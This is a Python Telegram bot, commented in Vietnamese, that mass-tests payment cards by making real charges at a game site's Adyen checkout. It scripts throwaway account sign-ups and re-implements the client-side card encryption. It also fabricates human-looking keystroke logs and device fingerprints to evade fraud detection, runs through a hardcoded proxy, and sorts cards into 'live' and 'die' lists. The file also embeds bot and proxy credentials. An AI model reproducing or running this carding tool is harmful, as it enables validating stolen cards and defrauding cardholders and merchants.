import logging
import sys
import re
import os
import json
import hmac
import hashlib
import base64
import time
import asyncio
import random
import string
import psutil
from datetime import datetime

# Thư viện Telegram
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters

# Import curl_cffi
try:
    from curl_cffi.requests import AsyncSession
except ImportError:
    print("Thiếu thư viện curl_cffi! Vui lòng chạy: pip install curl_cffi")
    sys.exit()

# Thư viện mã hóa
try:
    from Cryptodome.PublicKey import RSA
    from Cryptodome.Cipher import PKCS1_OAEP, AES
    from Cryptodome.Util.Padding import pad
    from jose import jwk
except ImportError:
    print("Thiếu thư viện crypto! Vui lòng chạy: pip install pycryptodomex python-jose")
    sys.exit()

# ===================================================================
# === CẤU HÌNH GLOBAL & PROXY
# ===================================================================

# Token Telegram
BOT_TOKEN = "8414556300:AAGs-pW76xOmEzi-SbLcHDaUOiUXtYpBq_0"

# Cấu hình Proxy cứng từ yêu cầu
PROXY_STR = "asg.360s5.com:3600:88634867-zone-custom:AetOKcLB"
p_host, p_port, p_user, p_pass = PROXY_STR.split(":")
PROXY_URL = f"http://{p_user}:{p_pass}@{p_host}:{p_port}"

PROXIES_CONFIG = {
    "http": PROXY_URL,
    "https": PROXY_URL
}

# Các key cấu hình
ADYEN_KEY = "10001|98BA34B1675D6C2540AC464A37D0F13CBF019896E8B889F387C1481F69B1E6041A6A2D2EC48F6496619641447BE2F2A4ACBCC4AA8F51FDF0F9DD2ABE6D5C41FB8AD54DF47980A6F90C273D549BBF6A2DADF8A9B12D269C1C73BB5E48C931AB8F4C3E1A5666F85D73FDE2A99DA0BD3C152B5AA4D538EA9A922FA8FCA01B6C176CDB2922FFAA3052651BA456E4FF7D8B010549BCDC4357EDD1FFE3D1111281BD4C1BDE53562960B3BB81CF5C4F2EC3EEA6888FC9598524E5C327336AE5DEACE77983FF804CFC0FC83A2B6FECBD1F024651598E8D556ED341A0F0C58C997A8837154C76226D76D6B4D2D3EA3C5FAE83AFF395F0BA5675EB3789C11C8718699E5E43"
STRIPE_KEY = "live_4TWKSNW445CGJJGVPEWXKHDAGMMTXVQT"
DOMAIN_URL = "https://taongafarm.com"

# Cấu hình Price Map (Mặc định là 1)
OFFER_MAP = {
    1: {"price": 1.99, "id": 38334},
    2: {"price": 4.99, "id": 38544},
    3: {"price": 9.99, "id": 38545},
    4: {"price": 19.99, "id": 38546},
    5: {"price": 49.99, "id": 38547},
    6: {"price": 99.99, "id": 38548},
}

# Biến toàn cục lưu cấu hình hiện tại (Mặc định gói 1)
CURRENT_OFFER_INDEX = 1

# Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# ===================================================================
# === PHẦN 1: THUẬT TOÁN MÃ HÓA ADYEN 4.8.0
# ===================================================================

def get_current_timestamp():
    return datetime.utcnow().isoformat() + 'Z'

def w(e):
    t = e
    if isinstance(t, str):
        t = t.encode('utf-8')
    return base64.b64encode(t).decode('utf-8')

def _(e):
    return w(e).replace('=', '').replace('+', '-').replace('/', '_')

def k(e):
    if not e:
        return bytearray(0)
    if len(e) % 2 == 1:
        e = "0" + e
    t = len(e) // 2
    r = bytearray(t)
    for n in range(t):
        r[n] = int(e[n*2:n*2+2], 16)
    return r

bt = 2**32

def mt(e, t, r):
    if not (0 <= t < bt):
        raise ValueError(f"value must be >= 0 and <= {bt - 1}. Received {t}")
    e[r:r+4] = [(t >> 24) & 0xff, (t >> 16) & 0xff, (t >> 8) & 0xff, t & 0xff]

class AdyenV4_8_0:
    def __init__(self, site_key):
        self.site_key = site_key
        self.key_object = None

    def generate_key(self):
        parts = self.site_key.split("|")
        if len(parts) != 2:
            raise ValueError("Malformed public key")
        part1 = parts[0]
        part2 = parts[1]
        decoded_part1 = k(part1)
        decoded_part2 = k(part2)
        encoded_part1 = _(decoded_part1)
        encoded_part2 = _(decoded_part2)

        self.key_object = {
            "kty": "RSA",
            "kid": "asf-key",
            "e": encoded_part1,
            "n": encoded_part2,
            "alg": "RSA-OAEP",
        }
        return self.key_object

    def encrypt_data(self, plain_text):
        public_key = jwk.construct(self.key_object)
        pem = public_key.to_pem().decode('utf-8')
        rsa_key = RSA.import_key(pem)
        random_bytes = os.urandom(64)
        cipher_rsa = PKCS1_OAEP.new(rsa_key)
        encrypted_key = cipher_rsa.encrypt(random_bytes)
        cek = random_bytes
        protected_header = {"alg":"RSA-OAEP","enc":"A256CBC-HS512","version":"1"}
        protected_header_b64 = _(json.dumps(protected_header).encode('utf-8'))
        _iv = os.urandom(16)
        _plaintext = json.dumps(plain_text).encode('utf-8')
        aes_key = cek[32:]
        hmac_key = cek[:32]
        cipher_aes = AES.new(aes_key, AES.MODE_CBC, _iv)
        padded_plaintext = pad(_plaintext, AES.block_size)
        ciphertext = cipher_aes.encrypt(padded_plaintext)
        protected_header2_bytes = protected_header_b64.encode('utf-8')
        f = len(protected_header2_bytes) * 8
        d = f // bt
        h_val = f % bt
        y = bytearray(8)
        mt(y, d, 0)
        mt(y, h_val, 4)
        hmac_obj = hmac.new(hmac_key, digestmod=hashlib.sha512)
        hmac_obj.update(protected_header2_bytes + _iv + ciphertext + y)
        tag = hmac_obj.digest()[:32]
        return f"{protected_header_b64}.{_(encrypted_key)}.{_(_iv)}.{_(ciphertext)}.{_(tag)}"

def format_card_number(card):
    return ' '.join(card[i:i+4] for i in range(0, len(card), 4))

def generate_fake_adyen_log(input_length):
    """
    Tạo chuỗi log giả lập hành vi người dùng (fo, cl, KN, ch, bl...)
    với timestamp tăng dần ngẫu nhiên.
    """
    base_time = random.randint(3000, 10000) # Thời gian bắt đầu ngẫu nhiên từ lúc load trang
    log_parts = []
    
    # 1. Focus (fo)
    base_time += random.randint(100, 500)
    log_parts.append(f"fo@{base_time}")
    
    # 2. Click (cl)
    base_time += random.randint(50, 200)
    log_parts.append(f"cl@{base_time}")
    
    # 3. KeyDown (KN) - Mô phỏng gõ từng ký tự
    for _ in range(input_length):
        base_time += random.randint(80, 250) # Tốc độ gõ phím người thật
        log_parts.append(f"KN@{base_time}")
        
    # 4. Change (ch) & Blur (bl)
    base_time += random.randint(50, 150)
    # log_parts.append(f"ch@{base_time}") # Một số trường hợp không cần ch nếu fill auto, nhưng thêm cho an toàn
    
    base_time += random.randint(100, 300)
    log_parts.append(f"bl@{base_time}") # Blur ra ngoài
    
    return ",".join(log_parts)

def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, domain=None):
    if not stripe_key: stripe_key = "live_2WKDYLJCMBFC5CFHBXY2CHZF4MUUJ7QU"
    if not domain: domain = "https://taongafarm.com"
    domain_b64 = base64.b64encode(domain.encode('utf-8')).decode('utf-8')
    referrer = f"https://checkoutshopper-live.adyen.com/checkoutshopper/securedfields/{stripe_key}/5.5.3/securedFields.html?type=card&d={domain_b64}"
    
    card_number_fmt = format_card_number(card)
    
    # --- TẠO LOG BEHAVIOR ĐỘNG ---
    # Log cho thẻ (16 số)
    card_log = generate_fake_adyen_log(16)
    # Log cho cvc (3 hoặc 4 số)
    cvc_log = generate_fake_adyen_log(len(str(cvc)))
    
    card_detail = {
        "encryptedCardNumber": {
            "number": card_number_fmt, 
            "generationtime": get_current_timestamp(), 
            "numberBind": "1", 
            "activate": "3", 
            "referrer": referrer, 
            "numberFieldFocusCount": "1", 
            "numberFieldLog": card_log, # Dữ liệu log động
            "numberFieldClickCount": "1", 
            "numberFieldKeyCount": str(len(card)),
            "numberFieldBlurCount": "1"
        },
        "encryptedExpiryMonth": {
            "expiryMonth": month, 
            "generationtime": get_current_timestamp()
        },
        "encryptedExpiryYear": {
            "expiryYear": year, 
            "generationtime": get_current_timestamp()
        },
        "encryptedSecurityCode": {
            "cvc": cvc, 
            "generationtime": get_current_timestamp(), 
            "cvcBind": "1", 
            "activate": "4", 
            "referrer": referrer, 
            "cvcFieldFocusCount": "1", 
            "cvcFieldLog": cvc_log, # Dữ liệu log động
            "cvcFieldClickCount": "1", 
            "cvcFieldKeyCount": str(len(str(cvc))), 
            "cvcFieldChangeCount": "1", 
            "cvcFieldBlurCount": "1", 
            "deactivate": "2"
        }
    }
    adyen_encryptor = AdyenV4_8_0(adyen_key)
    adyen_encryptor.generate_key()
    encrypted_details = {}
    for key, value in card_detail.items():
        encrypted_details[key] = adyen_encryptor.encrypt_data(value)
    return encrypted_details

# ===================================================================
# === PHẦN 2: HELPER FUNCTIONS (CẬP NHẬT NAME & LOGIC)
# ===================================================================

def normalize_card(card_str):
    pattern = r'(\d{13,19})[|/:](\d{1,2})[|/:](\d{2,4})[|/:](\d{3,4})'
    match = re.search(pattern, card_str)
    if not match:
        return None
    card_num, month, year, cvv = match.groups()
    try:
        month_int = int(month)
        if month_int < 1 or month_int > 12: return None
    except ValueError: return None
    month = month.zfill(2)
    if len(year) == 2: year = '20' + year
    try:
        year_int = int(year)
        if year_int < 2000 or year_int > 2099: return None
    except ValueError: return None
    return f"{card_num}|{month}|{year}|{cvv}"

def extract_cards_from_text(text):
    if not text: return []
    raw_pattern = r'(\d{13,19})\D+(\d{1,2})\D+(\d{2,4})\D+(\d{3,4})'
    matches = re.findall(raw_pattern, text)
    valid_cards = []
    seen = set()
    for m in matches:
        temp_str = f"{m[0]}|{m[1]}|{m[2]}|{m[3]}"
        normalized = normalize_card(temp_str)
        if normalized and normalized not in seen:
            valid_cards.append(normalized)
            seen.add(normalized)
    return valid_cards

def validate_luhn(card_number):
    card_num = ''.join(filter(str.isdigit, str(card_number)))
    if not card_num or len(card_num) < 13 or len(card_num) > 19: return False
    total = 0
    reverse_digits = card_num[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 1:
            n = n * 2
            if n > 9: n = n - 9
        total += n
    return total % 10 == 0

def get_short_brand_name(cc):
    first_digit = cc[0]
    if first_digit in ['5', '2']: return 'mc'
    elif first_digit == '4': return 'visa'
    elif cc.startswith(('34', '37')): return 'amex'
    elif cc.startswith(('60', '64', '65')): return 'discover'
    elif cc.startswith('62'): return 'cup'
    elif cc.startswith('35'): return 'jcb'
    elif cc.startswith(('30', '36', '38')): return 'diners'
    elif cc.startswith('67'): return 'maestro'
    else: return 'unknown'

def generate_random_email():
    """
    Tạo email random string 20 ký tự + @hotmail.com
    """
    chars = string.ascii_lowercase + string.digits  # a-z + 0-9
    random_str = ''.join(random.choices(chars, k=20))
    return f"{random_str}@hotmail.com"

def generate_dadus():
    user = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    json_string = f'{{"version":"1.0.0","deviceFingerprint":"1N39KVvVK8itaGr7odbrTKnBdbwt4n7PoYuk0009040344c{random.randint(100, 999)}iKzBGcrkpIQWp4A1B2M2Y8Asg0004erXqCOncs{random.randint(1000, 9909)}uFhJE00000WIL1VQ3oQKRWT1eb85Gu:40","persistentCookie":[],"components":{{"userAgent":"{user}","webdriver":0,"language":"vi-VN","colorDepth":24,"deviceMemory":8,"pixelRatio":1.25,"hardwareConcurrency":12,"screenWidth":2048,"screenHeight":1152,"availableScreenWidth":2048,"availableScreenHeight":1104,"timezoneOffset":-420,"timezone":"Asia/Bangkok","sessionStorage":1,"localStorage":1,"indexedDb":1,"addBehavior":0,"openDatabase":0,"platform":"Win32","plugins":"29cf71e3d81d74d43a5b0eb79405ba87","canvas":"a4375f9f6804450aa47496883e844553","webgl":"e05e860022c830166bcb93b7a3775148","webglVendorAndRenderer":"Google Inc. (NVIDIA)~ANGLE (NVIDIA, NVIDIA GeForce RTX 2060 (0x00001F08) Direct3D11 vs_5_0 ps_5_0, D3D11)","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":1,"hasLiedBrowser":0,"fonts":"41c37ee7a27152ed8fa4b3e6f2348b1b","audio":"902f0fe98719b779ea37f27528dfb0aa","enumerateDevices":"5f3fdaf4743eaa707ca6b7da65603892"}}}}'
    return base64.b64encode(json_string.encode('utf-8')).decode('utf-8')

# ===================================================================
# === PHẦN 3: XỬ LÝ CARD VÀ THÔNG TIN BIN
# ===================================================================

async def get_bin_info(session, cc_num):
    try:
        url = f"https://bins.antipublic.cc/bins/{cc_num}"
        resp = await session.get(url, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            return f"{data.get('brand','N/A')} - {data.get('country_name','N/A')} - {data.get('bank','N/A')} - {data.get('level','N/A')} - {data.get('type','N/A')}"
        else:
            return "BIN N/A"
    except Exception:
        return "BIN ERROR"

async def check_card_core(line, session_semaphore=None):
    """
    Core logic xử lý thẻ.
    Lấy thông tin price_val và offer_id từ biến toàn cục CURRENT_OFFER_INDEX
    """
    global CURRENT_OFFER_INDEX
    
    # Lấy config hiện tại
    current_config = OFFER_MAP.get(CURRENT_OFFER_INDEX, OFFER_MAP[1])
    price_val = current_config["price"]
    offer_id = current_config["id"]

    start_time = time.time()
    line = line.strip()
    result = {
        "status": "ERROR",
        "msg": "Invalid Format",
        "full_log": line + " - Invalid Format",
        "is_live": False
    }

    if not line: return result
    normalized = normalize_card(line)
    if not normalized: return result
    cc, mm, yyyy, cvc = normalized.split('|')
    
    if not validate_luhn(cc):
        result["msg"] = "Luhn Fail"
        result["full_log"] = f"{line} - Luhn Fail"
        return result

    if session_semaphore:
        async with session_semaphore:
            return await _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, start_time)
    else:
        return await _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, start_time)

async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, start_time):
    retry_count = 0
    max_retries = 20
    impersonate_ver = "chrome120"
    
    while retry_count < max_retries:
        try:
            async with AsyncSession(impersonate=impersonate_ver, proxies=PROXIES_CONFIG, verify=False) as session:
                # --- BƯỚC 1: LẤY TOKEN ---
                reg_headers = {'accept': '*/*', 'referer': 'https://taongafarm.com/en/'}
                resp_token = await session.get('https://taongafarm.com/api/token.js', headers=reg_headers, timeout=15)
                match = re.search(r"window\.csrftoken='([^']+)'", resp_token.text)
                if not match:
                    retry_count += 1
                    continue
                token = match.group(1)
                session.cookies.set('_csrf', token, domain='taongafarm.com')

                # --- BƯỚC 2: ĐĂNG KÝ ---
                current_email = generate_random_email()
                reg_data = {
                    'email': current_email, 'password': 'Minhnhat@@123',
                    'register_info': {
                        'device': {}, 'lang': 'en', 
                        'nav': {'cookieEnabled': True, 'platform': 'Win32', 'userAgent': 'Mozilla/5.0'}, 
                        'ref': 'direct', 'referrer': '', 'url': '/en/', 'urlarg': {}
                    },
                    'skip_email_validation': False, 'user_agree_terms': True,
                }
                api_headers = reg_headers.copy()
                api_headers.update({'x-csrf-token': token, 'content-type': 'application/json'})
                
                resp_reg = await session.post('https://taongafarm.com/api/login/signup', headers=api_headers, json=reg_data, timeout=15)
                if 'session_portal' not in session.cookies.get_dict():
                    retry_count += 1
                    continue

                # --- BƯỚC 3: MÃ HÓA (Đã tích hợp log behavior) ---
                encrypted_data = encrypt_card_data_480(cc, mm, yyyy, cvc, ADYEN_KEY, STRIPE_KEY, DOMAIN_URL)

                # --- BƯỚC 4: THANH TOÁN ---
                payment_headers = {
                    'content-type': 'application/json',
                    'origin': 'https://taongafarm.com',
                    'referer': 'https://taongafarm.com/en/payment/adyen/checkout/',
                }
                payment_json_data = {
                    'paymentRequest': {
                        'riskData': {'clientData': generate_dadus()},
                        'paymentMethod': {
                            'type': 'scheme', 'holderName': '',
                            'encryptedCardNumber': encrypted_data['encryptedCardNumber'],
                            'encryptedExpiryMonth': encrypted_data['encryptedExpiryMonth'],
                            'encryptedExpiryYear': encrypted_data['encryptedExpiryYear'],
                            'encryptedSecurityCode': encrypted_data['encryptedSecurityCode'],
                            'brand': get_short_brand_name(cc),
                            'checkoutAttemptId': 'fetch-checkoutAttemptId-failed',
                        },
                        'storePaymentMethod': False,
                        'browserInfo': {'acceptHeader': '*/*', 'colorDepth': 24, 'language': 'vi-VN', 'javaEnabled': False, 'screenHeight': 1152, 'screenWidth': 2048, 'userAgent': 'Mozilla/5.0', 'timeZoneOffset': -420, 'origin': 'https://taongafarm.com'},
                        'clientStateDataIndicator': True,
                    },
                    'checkoutRequest': {
                        'countryCodeFallback': 'GB', 'email': current_email,
                        'gameLanguage': 'en', 'gameLocale': 'en_US', 
                        'offerId': offer_id, 'platformId': '70345744830530987221', 
                        'platformType': 'portal', 'priceCurrency': 'USD', 'priceValue': price_val, 'quantity': 1,
                    },
                    'browserInfo': {'acceptHeader': '*/*', 'userAgent': 'Mozilla/5.0', 'language': 'en-US'},
                    'billingInfo': {'countryCode': 'US', 'postalCode': '53227'},
                }

                resp_pay = await session.post('https://taongafarm.com/payment/adyen/api/checkout/payment', headers=payment_headers, json=payment_json_data, timeout=20)
                try:
                    data = resp_pay.json()
                except:
                    retry_count += 1
                    continue

                # --- PHÂN TÍCH KẾT QUẢ ---
                additionalData = data.get('additionalData', {})
                cvcResultRaw = additionalData.get('cvcResultRaw', 'N/A')
                cvcResult = additionalData.get('cvcResult', 'N/A')
                avsResultRaw = additionalData.get('avsResultRaw', 'N/A')
                avsResult = additionalData.get('avsResult', 'N/A')
                resultCode = data.get('resultCode', additionalData.get('resultCode', 'N/A'))
                refusalReason = data.get('refusalReason', additionalData.get('refusalReason', 'N/A'))
                refusalReasonRaw = additionalData.get('refusalReasonRaw', 'N/A')

                bin_info_str = await get_bin_info(session, cc)
                
                if resultCode == "Authorised":
                    status = "APPROVED"
                    msg = f"APPROVED {price_val}$ - CHARGED"
                    is_live = True
                elif resultCode == "Refused":
                    status = "DECLINED"
                    msg = f"DIE - {refusalReason}"
                    is_live = False
                else:
                    status = "UNK"
                    msg = f"UNK - {data.get('message', resultCode)}"
                    is_live = False

                end_time = time.time()
                time_taken = round(end_time - start_time, 2)
                log_str = f"{cc}|{mm}|{yyyy}|{cvc}|{cvcResultRaw}|{cvcResult}|{avsResultRaw}|{avsResult}|{resultCode}|{refusalReasonRaw}|{msg} - [{bin_info_str}] - Time: {time_taken}s"

                return {
                    "status": status,
                    "is_live": is_live,
                    "full_log": log_str,
                    "bin_info": bin_info_str
                }

        except Exception:
            retry_count += 1
            await asyncio.sleep(0.5)
            continue

    return {"status": "ERROR", "is_live": False, "full_log": f"{cc}|{mm}|{yyyy}|{cvc}|ERROR|Timeout or Network Error"}

# ===================================================================
# === PHẦN 4: LOGIC XỬ LÝ HÀNG LOẠT
# ===================================================================

class CheckStats:
    def __init__(self):
        self.total = 0
        self.checked = 0
        self.live = 0
        self.die = 0
        self.error = 0
        self.start_time = time.time()
        self.is_running = True

async def process_card_list(update: Update, context: ContextTypes.DEFAULT_TYPE, card_list: list):
    global CURRENT_OFFER_INDEX
    
    total_cards = len(card_list)
    if total_cards == 0:
        await update.message.reply_text("❌ Không tìm thấy thẻ hợp lệ nào.")
        return

    # Lấy thông tin mode hiện tại để hiển thị
    current_config = OFFER_MAP.get(CURRENT_OFFER_INDEX)
    price_display = f"{current_config['price']}$"

    stats = CheckStats()
    stats.total = total_cards
    
    status_msg = await update.message.reply_text(
        f"🚀 **Starting 100 Threads...**\n"
        f"💰 Mode: {price_display}\n"
        f"Cards: {total_cards}"
    )

    chat_id = update.effective_chat.id
    live_file = f"live_{chat_id}.txt"
    die_file = f"die_{chat_id}.txt"
    error_file = f"error_{chat_id}.txt"
    
    for f_path in [live_file, die_file, error_file]:
        if os.path.exists(f_path): os.remove(f_path)

    semaphore = asyncio.Semaphore(100)
    file_lock = asyncio.Lock()
    
    async def update_ui_loop():
        while stats.is_running and stats.checked < stats.total:
            await asyncio.sleep(1.5)
            elapsed = time.time() - stats.start_time
            cpm = int((stats.checked / elapsed) * 60) if elapsed > 0 else 0
            cpu = psutil.cpu_percent()
            ram = psutil.virtual_memory().percent
            text = (
                f"⚡ **Checking in Progress...**\n"
                f"💰 Price: {price_display}\n"
                f"Total: {stats.total}\n"
                f"✅ Charge: {stats.live} | ❌ Die: {stats.die} | ⚠️ Error: {stats.error}\n"
                f"Checked: {stats.checked}/{stats.total}\n"
                f"🚀 CPM: {cpm}\n"
                f"🖥 CPU: {cpu}% | RAM: {ram}%"
            )
            try:
                await status_msg.edit_text(text)
            except: pass 

    ui_task = asyncio.create_task(update_ui_loop())

    async def worker(line):
        res = await check_card_core(line, session_semaphore=semaphore)
        stats.checked += 1
        async with file_lock:
            if res["is_live"]:
                stats.live += 1
                with open(live_file, "a", encoding="utf-8") as f: f.write(res["full_log"] + "\n")
            elif res["status"] == "ERROR":
                stats.error += 1
                with open(error_file, "a", encoding="utf-8") as f: f.write(res["full_log"] + "\n")
            else:
                stats.die += 1
                with open(die_file, "a", encoding="utf-8") as f: f.write(res["full_log"] + "\n")
    
    tasks = [worker(line) for line in card_list]
    await asyncio.gather(*tasks)

    stats.is_running = False
    await ui_task 

    await update.message.reply_text("✅ **Hoàn tất! Đang gửi kết quả...**")
    
    async def send_result_file(file_path, caption_title):
        if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
            try:
                with open(file_path, 'rb') as f:
                    await update.message.reply_document(document=f, caption=f"📂 {caption_title}")
            except Exception: pass
            finally:
                if os.path.exists(file_path): os.remove(file_path)
        elif os.path.exists(file_path): os.remove(file_path)

    await send_result_file(live_file, f"✅ Live Cards ({stats.live})")
    await send_result_file(die_file, f"❌ Die Cards ({stats.die})")
    await send_result_file(error_file, f"⚠️ Error/Invalid Cards ({stats.error})")

# ===================================================================
# === PHẦN 5: BOT COMMAND HANDLERS
# ===================================================================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 **Taonga Payment Bot - V2 Advanced**\n\n"
        "1. `/setam <1-6>`: Cài đặt mệnh giá charge.\n"
        "   1=1.99$, 2=4.99$, 3=9.99$, 4=19.99$, 5=49.99$, 6=99.99$\n"
        "2. Gửi file `.txt` hoặc `/mass` để check.\n"
        "3. `/st <cc>` để check lẻ.\n\n"
        f"🔥 Config hiện tại: Mode {CURRENT_OFFER_INDEX} ({OFFER_MAP[CURRENT_OFFER_INDEX]['price']}$)"
    )

async def set_amount_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Lệnh thay đổi mệnh giá charge
    Cú pháp: /setam <số thứ tự>
    """
    global CURRENT_OFFER_INDEX
    try:
        args = context.args
        if not args:
            await update.message.reply_text("⚠️ Vui lòng nhập số thứ tự. Ví dụ: `/setam 1`\n\nDanh sách:\n1: 1.99$\n2: 4.99$\n3: 9.99$\n4: 19.99$\n5: 49.99$\n6: 99.99$")
            return
        
        choice = int(args[0])
        if choice not in OFFER_MAP:
            await update.message.reply_text("⚠️ Lựa chọn không hợp lệ (1-6).")
            return
            
        CURRENT_OFFER_INDEX = choice
        config = OFFER_MAP[choice]
        await update.message.reply_text(f"✅ Đã chuyển sang chế độ: **{config['price']}$** (ID: {config['id']})")
        
    except ValueError:
        await update.message.reply_text("⚠️ Lỗi định dạng số.")

async def single_check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        full_text = update.message.text
        cards = extract_cards_from_text(full_text)
        if not cards:
            await update.message.reply_text("⚠️ Không tìm thấy thẻ.")
            return

        # Lấy config hiện tại để báo
        current_config = OFFER_MAP.get(CURRENT_OFFER_INDEX)
        
        card_data = cards[0]
        msg = await update.message.reply_text(f"⏳ Đang check: {card_data}\n💰 Mode: {current_config['price']}$")
        
        result = await check_card_core(card_data)
        
        if "full_log" in result and "bin_info" in result:
             base_log = result['full_log'].split(" - [")[0]
             bin_info = result['bin_info']
             time_str = result['full_log'].split("] - ")[-1] if "] - " in result['full_log'] else "N/A"
             
             formatted_response = f"💳 Card: `{card_data}`\n" \
                                  f"ℹ️ Status: {base_log}\n" \
                                  f"🏦 Bin: {bin_info}\n" \
                                  f"💰 Charge: {current_config['price']}$\n" \
                                  f"⏱ {time_str}"
        else:
             formatted_response = result['full_log']

        await msg.edit_text(formatted_response)
    except Exception as e:
        await update.message.reply_text(f"Lỗi: {str(e)}")

async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        full_text = update.message.text
        cards = extract_cards_from_text(full_text)
        if not cards:
            await update.message.reply_text("⚠️ Không tìm thấy thẻ.")
            return
        await process_card_list(update, context, cards)
    except Exception as e:
        await update.message.reply_text(f"Lỗi Mass: {str(e)}")

async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Chỉ nhận file .txt")
        return
    file = await context.bot.get_file(document.file_id)
    file_content = await file.download_as_bytearray()
    full_text = file_content.decode('utf-8')
    cards = extract_cards_from_text(full_text)
    await process_card_list(update, context, cards)

# ===================================================================
# === MAIN
# ===================================================================

if __name__ == '__main__':
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("st", single_check_command))
    app.add_handler(CommandHandler("mass", mass_command))
    app.add_handler(CommandHandler("setam", set_amount_command))
    app.add_handler(MessageHandler(filters.Document.ALL, file_handler))
    
    print("Bot đang chạy...")
    app.run_polling()
